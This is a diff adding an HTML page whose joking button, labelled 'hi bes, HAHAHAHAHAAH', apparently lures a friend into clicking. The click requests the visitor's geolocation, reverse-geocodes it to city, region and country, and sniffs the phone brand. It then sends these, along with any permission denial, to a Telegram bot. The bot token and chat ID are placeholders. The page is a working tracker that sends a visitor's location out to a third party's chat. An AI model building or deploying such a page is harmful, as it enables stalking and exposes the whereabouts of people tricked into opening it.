@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Info to Telegram</title>
+</head>
+<body>
+
+<button id="sendBtn" style="padding:15px 25px;font-size:18px;">
+hi bes, HAHAHAHAHAAH
+</button>
+
+<script>
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+document.getElementById("sendBtn").addEventListener("click", () => {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+    } else {
+        sendToTelegram("Location not supported");
+    }
+});
+
+function success(position) {
+    const lat = position.coords.latitude.toFixed(6);
+    const lon = position.coords.longitude.toFixed(6);
+    getLocationName(lat, lon);
+}
+
+function error() {
+    sendToTelegram("User denied location permission");
+}
+
+// Convert coordinates to city/region/country
+function getLocationName(lat, lon) {
+    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`;
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            let locationInfo = "Unknown Location";
+            if (data.address) {
+                const city = data.address.city || data.address.town || data.address.village || "";
+                const state = data.address.state || "";
+                const country = data.address.country || "";
+                locationInfo = [city, state, country].filter(Boolean).join(", ");
+            }
+            sendToTelegram(locationInfo);
+        })
+        .catch(() => sendToTelegram("Unable to get location name"));
+}
+
+// Detect device/phone brand
+function detectBrand(userAgent) {
+    const ua = userAgent.toLowerCase();
+    if (/iphone|ipad|ipod/.test(ua)) return "Apple iPhone/iPad";
+    if (/samsung|sm-/i.test(ua)) return "Samsung";
+    if (/huawei|honor/i.test(ua)) return "Huawei";
+    if (/oppo/i.test(ua)) return "Oppo";
+    if (/vivo/i.test(ua)) return "Vivo";
+    if (/xiaomi|redmi|mi /i.test(ua)) return "Xiaomi";
+    if (/oneplus/i.test(ua)) return "OnePlus";
+    return "Unknown/Other";
+}
+
+// Send message to Telegram
+function sendToTelegram(locationInfo) {
+    const now = new Date().toLocaleString();
+    const brand = detectBrand(navigator.userAgent);
+
+    const message =
+        `📌 NEW USER INFO\n` +
+        `📅 Date & Time: ${now}\n` +
+        `📱 Device Brand: ${brand}\n` +
+        `📍 Location: ${locationInfo}`;
+
+    const url =
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` +
+        encodeURIComponent(message);
+
+    fetch(url)
+        .then(() => alert("Info sent to Telegram!"))
+        .catch(() => alert("Failed to send."));
+}
+</script>
+
+</body>
+</html>
